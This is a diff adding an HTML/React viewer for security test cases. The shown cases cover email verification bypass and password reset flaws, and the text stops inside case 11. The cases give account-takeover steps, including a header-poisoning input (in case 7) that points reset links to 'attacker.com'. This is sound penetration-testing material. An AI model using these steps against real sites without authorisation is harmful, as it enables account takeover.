@@ -1,0 +1,5633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SecTest Hub – Cybersecurity Test Cases</title>
+
+    <!-- Tailwind via CDN -->
+    <script src="https://cdn.tailwindcss.com">
+    </script>
+    <!-- Font: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+    <!-- highlight.js for code syntax -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
+    <style>
+        /* ── reset & base ── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: #0d0d0f;
+            color: #e8e8ed;
+            height: 100vh;
+            overflow: hidden;
+        }
+        #root {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ── scrollbar ── */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #3a3a44;
+            border-radius: 8px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+
+        /* ── markdown typography ── */
+        .markdown-body {
+            font-size: 16px;
+            line-height: 1.7;
+            color: #e8e8ed;
+            max-width: 880px;
+            margin: 0 auto;
+            padding: 0 16px 80px;
+        }
+        .markdown-body h1 {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin: 0 0 12px 0;
+            color: #f0f0f5;
+            border-bottom: 1px solid #2a2a30;
+            padding-bottom: 14px;
+        }
+        .markdown-body h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 36px 0 12px 0;
+            color: #ececf1;
+            letter-spacing: -0.01em;
+        }
+        .markdown-body h3 {
+            font-size: 19px;
+            font-weight: 600;
+            margin: 28px 0 10px 0;
+            color: #e4e4ea;
+        }
+        .markdown-body h4 {
+            font-size: 17px;
+            font-weight: 600;
+            margin: 22px 0 8px 0;
+            color: #dddde3;
+        }
+        .markdown-body p {
+            margin: 0 0 16px 0;
+            color: #d4d4dc;
+        }
+        .markdown-body ul,
+        .markdown-body ol {
+            margin: 0 0 16px 0;
+            padding-left: 24px;
+            color: #d4d4dc;
+        }
+        .markdown-body li {
+            margin-bottom: 4px;
+        }
+        .markdown-body li>ul,
+        .markdown-body li>ol {
+            margin-top: 4px;
+            margin-bottom: 4px;
+        }
+        .markdown-body blockquote {
+            margin: 16px 0;
+            padding: 10px 20px;
+            border-left: 4px solid #4a6cf7;
+            background: #18181e;
+            border-radius: 4px;
+            color: #c8c8d4;
+        }
+        .markdown-body blockquote p {
+            margin: 0;
+        }
+        .markdown-body hr {
+            border: none;
+            border-top: 1px solid #2a2a30;
+            margin: 32px 0;
+        }
+        .markdown-body a {
+            color: #6a8cff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: border-color 0.15s;
+        }
+        .markdown-body a:hover {
+            border-bottom-color: #6a8cff;
+        }
+        .markdown-body img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 12px 0;
+        }
+
+        /* ── inline code ── */
+        .markdown-body code:not(pre code) {
+            background: #1e1e24;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.9em;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            color: #d4d4dc;
+            border: 1px solid #2a2a30;
+        }
+
+        /* ── code blocks ── */
+        .markdown-body pre {
+            background: #141418;
+            border: 1px solid #28282e;
+            border-radius: 10px;
+            padding: 0;
+            margin: 16px 0 20px 0;
+            overflow: hidden;
+            position: relative;
+        }
+        .markdown-body pre code {
+            display: block;
+            padding: 16px 20px;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            color: #d4d4dc;
+            background: transparent;
+            border: none;
+            white-space: pre;
+        }
+        .markdown-body pre .hljs {
+            background: transparent !important;
+        }
+        .code-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 6px 16px 4px 16px;
+            background: #1a1a20;
+            border-bottom: 1px solid #28282e;
+            font-size: 12px;
+            font-weight: 500;
+            color: #8888a0;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+        .code-header .lang-label {
+            font-size: 11px;
+            font-weight: 600;
+            color: #6a6a80;
+        }
+        .copy-btn {
+            background: transparent;
+            border: none;
+            color: #6a6a80;
+            cursor: pointer;
+            font-size: 13px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            transition: background 0.15s, color 0.15s;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .copy-btn:hover {
+            background: #2a2a32;
+            color: #c8c8d4;
+        }
+        .copy-btn.copied {
+            color: #4ade80;
+        }
+
+        /* ── tables ── */
+        .markdown-body table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 16px 0;
+            font-size: 15px;
+            overflow-x: auto;
+            display: block;
+        }
+        .markdown-body table thead {
+            background: #1a1a20;
+        }
+        .markdown-body table th {
+            padding: 10px 14px;
+            text-align: left;
+            font-weight: 600;
+            color: #e0e0e8;
+            border-bottom: 2px solid #2a2a30;
+        }
+        .markdown-body table td {
+            padding: 10px 14px;
+            border-bottom: 1px solid #22222a;
+            color: #d0d0da;
+        }
+        .markdown-body table tr:hover td {
+            background: #18181e;
+        }
+
+        /* ── metadata badges ── */
+        .badge {
+            display: inline-block;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 3px 12px;
+            border-radius: 20px;
+            background: #1e1e28;
+            color: #a0a0b8;
+            border: 1px solid #2a2a34;
+            margin-right: 6px;
+            margin-bottom: 4px;
+        }
+        .badge-category {
+            background: #1a2a4a;
+            color: #7a9aff;
+            border-color: #2a3a5a;
+        }
+        .badge-bugtype {
+            background: #2a1a2a;
+            color: #d47aff;
+            border-color: #3a2a3a;
+        }
+        .badge-severity {
+            background: #2a2a1a;
+            color: #ffd47a;
+            border-color: #3a3a2a;
+        }
+
+        /* ── TOC ── */
+        .toc {
+            background: #14141a;
+            border: 1px solid #22222a;
+            border-radius: 10px;
+            padding: 14px 18px;
+            margin: 20px 0 28px 0;
+        }
+        .toc-title {
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: #6a6a80;
+            margin-bottom: 8px;
+        }
+        .toc a {
+            display: inline-block;
+            font-size: 14px;
+            color: #9a9ab0;
+            text-decoration: none;
+            padding: 2px 0;
+            margin-right: 16px;
+            border-bottom: none;
+            transition: color 0.15s;
+        }
+        .toc a:hover {
+            color: #c8c8e0;
+        }
+
+        /* ── sidebar ── */
+        .sidebar {
+            background: #0f0f13;
+            border-right: 1px solid #1e1e26;
+            width: 280px;
+            min-width: 280px;
+            height: 100%;
+            overflow-y: auto;
+            padding: 16px 12px 40px;
+            display: flex;
+            flex-direction: column;
+        }
+        .sidebar-title {
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: #f0f0f5;
+            padding: 0 4px 14px 4px;
+            border-bottom: 1px solid #1e1e26;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .sidebar-title span {
+            color: #6a8cff;
+        }
+        .sidebar-search {
+            position: relative;
+            margin-bottom: 16px;
+        }
+        .sidebar-search input {
+            width: 100%;
+            padding: 8px 12px 8px 36px;
+            border-radius: 8px;
+            border: 1px solid #22222a;
+            background: #16161c;
+            color: #e0e0e8;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+            font-family: inherit;
+        }
+        .sidebar-search input::placeholder {
+            color: #5a5a6a;
+        }
+        .sidebar-search input:focus {
+            border-color: #4a6cf7;
+        }
+        .sidebar-search .icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #5a5a6a;
+            font-size: 15px;
+        }
+
+        .category-group {
+            margin-bottom: 6px;
+        }
+        .category-header {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 5px 6px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #a0a0b8;
+            cursor: pointer;
+            transition: background 0.12s;
+            user-select: none;
+        }
+        .category-header:hover {
+            background: #18181e;
+        }
+        .category-header .arrow {
+            font-size: 11px;
+            transition: transform 0.2s;
+            color: #5a5a6a;
+        }
+        .category-header .arrow.open {
+            transform: rotate(90deg);
+        }
+        .category-header .count {
+            margin-left: auto;
+            font-size: 11px;
+            font-weight: 400;
+            color: #4a4a5a;
+        }
+        .test-list {
+            padding-left: 6px;
+            margin-top: 2px;
+            overflow: hidden;
+            max-height: 0;
+            transition: max-height 0.25s ease;
+        }
+        .test-list.open {
+            max-height: 2000px;
+        }
+        .test-item {
+            display: block;
+            padding: 4px 6px 4px 16px;
+            font-size: 13px;
+            color: #b0b0c0;
+            border-radius: 4px;
+            text-decoration: none;
+            transition: background 0.12s, color 0.12s;
+            cursor: pointer;
+            border-left: 2px solid transparent;
+        }
+        .test-item:hover {
+            background: #18181e;
+            color: #e0e0e8;
+        }
+        .test-item.active {
+            background: #1a1a28;
+            color: #f0f0f5;
+            border-left-color: #4a6cf7;
+        }
+        .test-item .num {
+            font-weight: 500;
+            color: #6a6a8a;
+            margin-right: 6px;
+            font-size: 12px;
+        }
+        .test-item .title {
+            font-weight: 400;
+            font-size: 12.5px;
+        }
+
+        /* ── header ── */
+        .app-header {
+            background: #0d0d0f;
+            border-bottom: 1px solid #1a1a22;
+            padding: 8px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-shrink: 0;
+            min-height: 52px;
+            position: sticky;
+            top: 0;
+            z-index: 30;
+            backdrop-filter: blur(8px);
+            background: rgba(13, 13, 15, 0.92);
+        }
+        .app-header .brand {
+            font-size: 17px;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: #f0f0f5;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .app-header .brand span {
+            color: #6a8cff;
+        }
+        .app-header .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .theme-toggle,
+        .raw-toggle {
+            background: transparent;
+            border: 1px solid #22222a;
+            color: #a0a0b8;
+            padding: 5px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .theme-toggle:hover,
+        .raw-toggle:hover {
+            background: #18181e;
+            border-color: #33333e;
+            color: #e0e0e8;
+        }
+        .theme-toggle.active,
+        .raw-toggle.active {
+            border-color: #4a6cf7;
+            color: #e0e0e8;
+            background: #14142a;
+        }
+
+        /* ── main layout ── */
+        .app-layout {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+        .content-area {
+            flex: 1;
+            overflow-y: auto;
+            background: #0d0d0f;
+            padding: 0 8px;
+        }
+        .content-inner {
+            max-width: 920px;
+            margin: 0 auto;
+            padding: 20px 16px 60px;
+        }
+
+        /* ── nav ── */
+        .nav-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0 18px 0;
+            border-bottom: 1px solid #1a1a22;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .nav-btn {
+            background: transparent;
+            border: 1px solid #22222a;
+            color: #a0a0b8;
+            padding: 6px 16px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s, color 0.15s;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .nav-btn:hover:not(:disabled) {
+            background: #18181e;
+            border-color: #33333e;
+            color: #e0e0e8;
+        }
+        .nav-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        /* ── raw markdown view ── */
+        .raw-viewer {
+            background: #0a0a0e;
+            border: 1px solid #1e1e26;
+            border-radius: 10px;
+            padding: 20px 24px;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 14px;
+            line-height: 1.7;
+            white-space: pre-wrap;
+            word-break: break-word;
+            color: #c8c8d4;
+            max-height: 70vh;
+            overflow-y: auto;
+            margin: 12px 0;
+        }
+        .raw-viewer .line-num {
+            color: #4a4a5a;
+            user-select: none;
+            margin-right: 16px;
+        }
+
+        /* ── mobile drawer ── */
+        .drawer-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 40;
+        }
+        .drawer-overlay.open {
+            display: block;
+        }
+        .drawer-sidebar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 290px;
+            height: 100%;
+            background: #0d0d0f;
+            border-right: 1px solid #1a1a22;
+            z-index: 50;
+            transform: translateX(-100%);
+            transition: transform 0.25s ease;
+            overflow-y: auto;
+            padding: 16px 12px 40px;
+        }
+        .drawer-sidebar.open {
+            transform: translateX(0);
+        }
+        .drawer-close {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            background: transparent;
+            border: none;
+            color: #a0a0b8;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .hamburger {
+            background: transparent;
+            border: none;
+            color: #a0a0b8;
+            font-size: 22px;
+            cursor: pointer;
+            display: none;
+            padding: 0 4px;
+        }
+
+        /* ── responsive ── */
+        @media (max-width: 860px) {
+            .sidebar {
+                display: none;
+            }
+            .hamburger {
+                display: block;
+            }
+            .markdown-body {
+                padding: 0 6px 60px;
+                font-size: 15px;
+            }
+            .markdown-body h1 {
+                font-size: 26px;
+            }
+            .markdown-body h2 {
+                font-size: 21px;
+            }
+            .markdown-body h3 {
+                font-size: 17px;
+            }
+            .content-inner {
+                padding: 12px 6px 40px;
+            }
+            .app-header {
+                padding: 6px 12px;
+            }
+            .app-header .brand {
+                font-size: 15px;
+            }
+            .theme-toggle,
+            .raw-toggle {
+                font-size: 12px;
+                padding: 4px 10px;
+            }
+        }
+        @media (max-width: 480px) {
+            .markdown-body {
+                font-size: 14px;
+                padding: 0 4px 40px;
+            }
+            .markdown-body h1 {
+                font-size: 22px;
+            }
+            .markdown-body h2 {
+                font-size: 18px;
+            }
+            .markdown-body h3 {
+                font-size: 16px;
+            }
+            .markdown-body pre code {
+                font-size: 12px;
+                padding: 12px 14px;
+            }
+            .app-header .brand {
+                font-size: 14px;
+            }
+            .nav-btn {
+                font-size: 12px;
+                padding: 4px 12px;
+            }
+            .badge {
+                font-size: 11px;
+                padding: 2px 10px;
+            }
+        }
+
+        /* ── light theme ── */
+        .light-theme body {
+            background: #f5f5f7;
+            color: #1a1a1e;
+        }
+        .light-theme .app-header {
+            background: rgba(245, 245, 247, 0.92);
+            border-bottom-color: #e0e0e4;
+        }
+        .light-theme .app-header .brand {
+            color: #1a1a1e;
+        }
+        .light-theme .sidebar {
+            background: #f0f0f2;
+            border-right-color: #e0e0e4;
+        }
+        .light-theme .sidebar-title {
+            color: #1a1a1e;
+            border-bottom-color: #e0e0e4;
+        }
+        .light-theme .sidebar-search input {
+            background: #e8e8ec;
+            border-color: #d0d0d8;
+            color: #1a1a1e;
+        }
+        .light-theme .sidebar-search input::placeholder {
+            color: #7a7a8a;
+        }
+        .light-theme .category-header {
+            color: #3a3a4a;
+        }
+        .light-theme .category-header:hover {
+            background: #e4e4e8;
+        }
+        .light-theme .test-item {
+            color: #3a3a4a;
+        }
+        .light-theme .test-item:hover {
+            background: #e4e4e8;
+            color: #1a1a1e;
+        }
+        .light-theme .test-item.active {
+            background: #d4d4e0;
+            color: #1a1a1e;
+            border-left-color: #4a6cf7;
+        }
+        .light-theme .content-area {
+            background: #f5f5f7;
+        }
+        .light-theme .markdown-body {
+            color: #1a1a1e;
+        }
+        .light-theme .markdown-body h1 {
+            color: #1a1a1e;
+            border-bottom-color: #d0d0d8;
+        }
+        .light-theme .markdown-body h2 {
+            color: #1a1a1e;
+        }
+        .light-theme .markdown-body h3 {
+            color: #22222a;
+        }
+        .light-theme .markdown-body p {
+            color: #2a2a32;
+        }
+        .light-theme .markdown-body ul,
+        .light-theme .markdown-body ol {
+            color: #2a2a32;
+        }
+        .light-theme .markdown-body blockquote {
+            background: #eaeaee;
+            border-left-color: #4a6cf7;
+            color: #2a2a32;
+        }
+        .light-theme .markdown-body code:not(pre code) {
+            background: #e8e8ec;
+            color: #1a1a1e;
+            border-color: #d0d0d8;
+        }
+        .light-theme .markdown-body pre {
+            background: #eaeaee;
+            border-color: #d0d0d8;
+        }
+        .light-theme .markdown-body pre code {
+            color: #1a1a1e;
+        }
+        .light-theme .code-header {
+            background: #e0e0e6;
+            border-bottom-color: #d0d0d8;
+            color: #5a5a6a;
+        }
+        .light-theme .code-header .lang-label {
+            color: #5a5a6a;
+        }
+        .light-theme .copy-btn {
+            color: #5a5a6a;
+        }
+        .light-theme .copy-btn:hover {
+            background: #d0d0d8;
+            color: #1a1a1e;
+        }
+        .light-theme .toc {
+            background: #eaeaee;
+            border-color: #d0d0d8;
+        }
+        .light-theme .toc-title {
+            color: #5a5a6a;
+        }
+        .light-theme .toc a {
+            color: #4a4a5a;
+        }
+        .light-theme .toc a:hover {
+            color: #1a1a1e;
+        }
+        .light-theme .markdown-body table thead {
+            background: #eaeaee;
+        }
+        .light-theme .markdown-body table th {
+            color: #1a1a1e;
+            border-bottom-color: #d0d0d8;
+        }
+        .light-theme .markdown-body table td {
+            color: #2a2a32;
+            border-bottom-color: #d8d8e0;
+        }
+        .light-theme .markdown-body table tr:hover td {
+            background: #eaeaee;
+        }
+        .light-theme .badge {
+            background: #e4e4e8;
+            color: #3a3a4a;
+            border-color: #d0d0d8;
+        }
+        .light-theme .badge-category {
+            background: #d4dcec;
+            color: #2a4a8a;
+            border-color: #b0c0d8;
+        }
+        .light-theme .badge-bugtype {
+            background: #e8d4ec;
+            color: #6a2a8a;
+            border-color: #d0b0d8;
+        }
+        .light-theme .badge-severity {
+            background: #ece8d4;
+            color: #8a7a2a;
+            border-color: #d8d0b0;
+        }
+        .light-theme .nav-row {
+            border-bottom-color: #d0d0d8;
+        }
+        .light-theme .nav-btn {
+            border-color: #d0d0d8;
+            color: #3a3a4a;
+        }
+        .light-theme .nav-btn:hover:not(:disabled) {
+            background: #e4e4e8;
+            border-color: #b0b0b8;
+            color: #1a1a1e;
+        }
+        .light-theme .raw-viewer {
+            background: #eaeaee;
+            border-color: #d0d0d8;
+            color: #1a1a1e;
+        }
+        .light-theme .raw-viewer .line-num {
+            color: #7a7a8a;
+        }
+        .light-theme .app-header .brand span {
+            color: #4a6cf7;
+        }
+        .light-theme .theme-toggle,
+        .light-theme .raw-toggle {
+            border-color: #d0d0d8;
+            color: #3a3a4a;
+        }
+        .light-theme .theme-toggle:hover,
+        .light-theme .raw-toggle:hover {
+            background: #e4e4e8;
+            border-color: #b0b0b8;
+            color: #1a1a1e;
+        }
+        .light-theme .theme-toggle.active,
+        .light-theme .raw-toggle.active {
+            border-color: #4a6cf7;
+            background: #d4dcec;
+            color: #1a1a1e;
+        }
+        .light-theme .drawer-sidebar {
+            background: #f5f5f7;
+            border-right-color: #e0e0e4;
+        }
+        .light-theme .drawer-close {
+            color: #3a3a4a;
+        }
+        .light-theme .hamburger {
+            color: #3a3a4a;
+        }
+        .light-theme .drawer-overlay {
+            background: rgba(0, 0, 0, 0.3);
+        }
+        .light-theme .test-item .num {
+            color: #6a6a8a;
+        }
+        .light-theme .category-header .count {
+            color: #6a6a8a;
+        }
+        .light-theme .category-header .arrow {
+            color: #6a6a8a;
+        }
+
+        /* syntax highlighting overrides for light */
+        .light-theme .markdown-body pre .hljs {
+            color: #1a1a1e !important;
+        }
+        .light-theme .markdown-body pre .hljs-keyword,
+        .light-theme .markdown-body pre .hljs-built_in,
+        .light-theme .markdown-body pre .hljs-type {
+            color: #7a3a9a !important;
+        }
+        .light-theme .markdown-body pre .hljs-string {
+            color: #2a7a3a !important;
+        }
+        .light-theme .markdown-body pre .hljs-comment {
+            color: #5a6a7a !important;
+        }
+        .light-theme .markdown-body pre .hljs-number {
+            color: #9a6a2a !important;
+        }
+        .light-theme .markdown-body pre .hljs-function {
+            color: #3a5a9a !important;
+        }
+
+        /* highlight.js dark overrides */
+        .markdown-body pre .hljs-keyword,
+        .markdown-body pre .hljs-built_in,
+        .markdown-body pre .hljs-type {
+            color: #c77aff !important;
+        }
+        .markdown-body pre .hljs-string {
+            color: #6ade8a !important;
+        }
+        .markdown-body pre .hljs-comment {
+            color: #6a7a8a !important;
+        }
+        .markdown-body pre .hljs-number {
+            color: #e8b86a !important;
+        }
+        .markdown-body pre .hljs-function {
+            color: #7aaaff !important;
+        }
+
+        /* smooth scroll */
+        .content-area {
+            scroll-behavior: smooth;
+        }
+
+        /* search results highlight */
+        .search-highlight {
+            background: #3a3a5a;
+            color: #f0f0f5;
+            padding: 0 2px;
+            border-radius: 2px;
+        }
+        .light-theme .search-highlight {
+            background: #d4d4e8;
+            color: #1a1a1e;
+        }
+        .no-results {
+            color: #5a5a6a;
+            font-size: 14px;
+            padding: 12px 6px;
+            text-align: center;
+        }
+        .no-results strong {
+            color: #7a7a8a;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="root"></div>
+
+    <!-- ─── React + deps via importmap ─── -->
+    <script type="importmap">
+        {
+            "imports": {
+                "react": "https://esm.sh/react@18.2.0",
+                "react-dom/client": "https://esm.sh/react-dom@18.2.0/client",
+                "react-markdown": "https://esm.sh/react-markdown@9.0.1",
+                "remark-gfm": "https://esm.sh/remark-gfm@4.0.0",
+                "rehype-highlight": "https://esm.sh/rehype-highlight@7.0.0"
+            }
+        }
+    </script>
+
+    <script type="module">
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  IMPORTS
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        import React, {
+            useState,
+            useEffect,
+            useMemo,
+            useCallback,
+            useRef,
+            createContext,
+            useContext
+        } from 'react';
+        import { createRoot } from 'react-dom/client';
+        import ReactMarkdown from 'react-markdown';
+        import remarkGfm from 'remark-gfm';
+        import rehypeHighlight from 'rehype-highlight';
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  DATA  (test cases from the provided file)
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        const TEST_CASES = [{
+            id: 1,
+            category: 'Email Verification Bypass',
+            bugType: 'email-verification-bypass',
+            title: 'OTP Parameter Manipulation',
+            markdown: `# Test Case 1 – OTP Parameter Manipulation
+
+        ## Bug Type
+
+        \`email-verification-bypass\` · \`parameter-manipulation\`
+
+        ## Description
+
+        Test whether the OTP verification process allows parameter manipulation to verify a different email address.
+
+        ## Steps
+
+        1. Create account and receive OTP verification.
+        2. Capture OTP verification request in Burp.
+        3. Look for \`email\` parameter in the request.
+        4. Replace attacker's email with victim's email.
+        5. Submit valid OTP with victim's email.
+        6. Check if account now shows victim's email.
+        7. Logout and login with victim's email & password.
+
+        ## Expected Result
+
+        The application should reject the request if the email parameter does not match the session.
+
+        ## Security Impact
+
+        High – allows full account takeover.
+        `
+        }, {
+            id: 2,
+            category: 'Email Verification Bypass',
+            bugType: 'email-verification-bypass',
+            title: 'Reusing Old Verification Link',
+            markdown: `# Test Case 2 – Reusing Old Verification Link
+
+        ## Bug Type
+
+        \`email-verification-bypass\` · \`token-reuse\`
+
+        ## Description
+
+        Test whether an old verification link can be reused after the email address has been changed.
+
+        ## Steps
+
+        1. Sign up as \`attacker@mail.com\`.
+        2. Receive confirmation email – DO NOT open.
+        3. Navigate to account settings without verifying.
+        4. Change email to \`victim@mail.com\`.
+        5. Receive new verification link for victim.
+        6. Instead of new link, open the previous link from attacker's inbox.
+        7. If victim's email gets verified, this is a bypass.
+
+        ## Expected Result
+
+        Old verification links should be invalidated when the email changes.
+
+        ## Security Impact
+
+        High – allows email takeover without access to victim's inbox.
+        `
+        }, {
+            id: 3,
+            category: 'Email Verification Bypass',
+            bugType: 'email-verification-bypass',
+            title: 'Forced Browsing',
+            markdown: `# Test Case 3 – Forced Browsing
+
+        ## Bug Type
+
+        \`email-verification-bypass\` · \`forced-browsing\`
+
+        ## Description
+
+        Test whether protected resources can be accessed without email verification.
+
+        ## Steps
+
+        1. Sign up with \`attacker@mail.com\`.
+        2. Don't verify email.
+        3. Directly navigate to files/endpoints that should be accessible only after verification.
+        4. Check if you can access protected resources.
+
+        ## Expected Result
+
+        The application should block access to protected resources until email is verified.
+
+        ## Security Impact
+
+        Medium – may expose sensitive functionality.
+        `
+        }, {
+            id: 4,
+            category: 'Email Verification Bypass',
+            bugType: 'email-verification-bypass',
+            title: 'Response/Status Code Manipulation',
+            markdown: `# Test Case 4 – Response/Status Code Manipulation
+
+        ## Bug Type
+
+        \`email-verification-bypass\` · \`response-manipulation\`
+
+        ## Description
+
+        Test whether manipulating the server response can bypass email verification.
+
+        ## Steps
+
+        1. Trigger verification check.
+        2. Intercept response.
+        3. Replace error status (403) with success status (200).
+        4. Check if verification bypass is successful.
+
+        ## Expected Result
+
+        Server-side verification should not be bypassable by client-side response manipulation.
+
+        ## Security Impact
+
+        High – allows verification bypass via proxy.
+        `
+        }, {
+            id: 5,
+            category: 'Email Verification Bypass',
+            bugType: 'email-verification-bypass',
+            title: 'HTTP Protocol Issue',
+            markdown: `# Test Case 5 – HTTP Protocol Issue
+
+        ## Bug Type
+
+        \`email-verification-bypass\` · \`insecure-protocol\`
+
+        ## Description
+
+        Verify that email verification links are sent over HTTPS.
+
+        ## Impact
+
+        - Email OTP link sent over unsecured HTTP protocol.
+        - Anyone from intermediate computers can sniff and verify the email.
+
+        ## Mitigation
+
+        Always generate email OTP links with secured HTTPS protocol.
+
+        ## Expected Result
+
+        All verification links should use HTTPS.
+
+        ## Security Impact
+
+        Medium – enables MITM attacks.
+        `
+        }, {
+            id: 6,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Password Reset – ID Parameter Tampering',
+            markdown: `# Test Case 6 – Password Reset – ID Parameter Tampering
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`idor\`
+
+        ## Description
+
+        Test whether the password reset process is vulnerable to ID parameter tampering.
+
+        ## Steps
+
+        1. Request password reset for attacker account.
+        2. Click the reset link from email.
+        3. Enter new password.
+        4. Intercept the password confirmation request.
+        5. Change user ID/email/username to victim's ID.
+        6. Submit request.
+        7. Victim's password is now changed.
+
+        ## Expected Result
+
+        The application should bind the reset token to the user and reject tampering.
+
+        ## Security Impact
+
+        Critical – allows password reset of any account.
+        `
+        }, {
+            id: 7,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Password Reset – Host Header Poisoning',
+            markdown: `# Test Case 7 – Password Reset – Host Header Poisoning
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`header-poisoning\`
+
+        ## Description
+
+        Test whether the Host header can be poisoned to send reset tokens to an attacker-controlled server.
+
+        ## Steps
+
+        1. Request password reset.
+        2. Intercept request.
+        3. Modify Host header or add:
+           - \`X-Forwarded-Host: attacker.com\`
+           - \`Referrer: attacker.com\`
+        4. Check if reset token is sent to attacker's server.
+
+        ## Expected Result
+
+        The application should use a trusted host for generating links.
+
+        ## Security Impact
+
+        High – token theft via header injection.
+        `
+        }, {
+            id: 8,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Token Leak in Response',
+            markdown: `# Test Case 8 – Token Leak in Response
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`token-leak\`
+
+        ## Description
+
+        Test whether reset tokens or OTPs are leaked in the server response.
+
+        ## Steps
+
+        1. Register new account (or request password reset).
+        2. Intercept the response.
+        3. Check if response contains:
+           - Verification link
+           - Token
+           - OTP
+
+        ## Expected Result
+
+        Tokens should never be returned in the response body.
+
+        ## Security Impact
+
+        High – token exposure leads to account takeover.
+        `
+        }, {
+            id: 9,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Reset Link Not Expiring After Use',
+            markdown: `# Test Case 9 – Reset Link Not Expiring After Use
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`token-expiration\`
+
+        ## Description
+
+        Test whether a reset link remains valid after it has been used.
+
+        ## Steps
+
+        1. Request password reset – get link.
+        2. Use the link to reset password.
+        3. Request password reset again.
+        4. Try to use the old (already used) reset link.
+        5. If it works → vulnerable.
+
+        ## Expected Result
+
+        Reset links should be invalidated immediately after use.
+
+        ## Security Impact
+
+        High – allows repeated resets with same token.
+        `
+        }, {
+            id: 10,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Reset Link Not Expiring with New Token',
+            markdown: `# Test Case 10 – Reset Link Not Expiring with New Token
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`token-invalidation\`
+
+        ## Description
+
+        Test whether old reset links remain valid after a new token is requested.
+
+        ## Steps
+
+        1. Request password reset – get link.
+        2. Request password reset again – get new link.
+        3. Try to use the old (1st) reset link.
+        4. If it works → vulnerable.
+
+        ## Expected Result
+
+        Old tokens should be invalidated when a new token is generated.
+
+        ## Security Impact
+
+        High – token reuse across requests.
+        `
+        }, {
+            id: 11,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Reset Token Predictability',
+            markdown: `# Test Case 11 – Reset Token Predictability
+
+        ## Bug Type
+
